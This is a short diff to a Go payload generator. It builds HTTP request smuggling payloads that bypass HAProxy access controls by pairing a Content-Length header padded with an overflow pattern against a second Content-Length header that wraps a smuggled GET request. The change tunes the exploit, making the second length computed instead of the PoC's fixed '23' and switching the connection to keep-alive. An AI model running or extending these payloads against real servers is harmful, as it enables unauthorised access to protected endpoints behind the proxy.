@@ -59,8 +59,9 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
 			path, publicPath, host)
 
-		// Use the fixed Content-Length value from the PoC for the exploit's second CL header
-		calculatedContentLengthForSecondHeader := "23" // Changed from len(smuggledRequest)
+		// Properly calculate the content length dynamically for the *second* Content-Length header:
+		// This is specific to the exploit technique.
+		calculatedContentLengthForSecondHeader := len(smuggledRequest) // Reverted
 
 		malformedHeaderName := "Content-Length" + overflowPattern + ":"
 
@@ -80,11 +81,11 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 				},
 				{
 					Header: "Content-Length",
-					Value:  calculatedContentLengthForSecondHeader, // Uses "23"
+					Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader), // Reverted
 				},
 				{
 					Header: "Connection",
-					Value:  "close", // Changed from "keep-alive"
+					Value:  "keep-alive", // Reverted
 				},
 			},
 		}
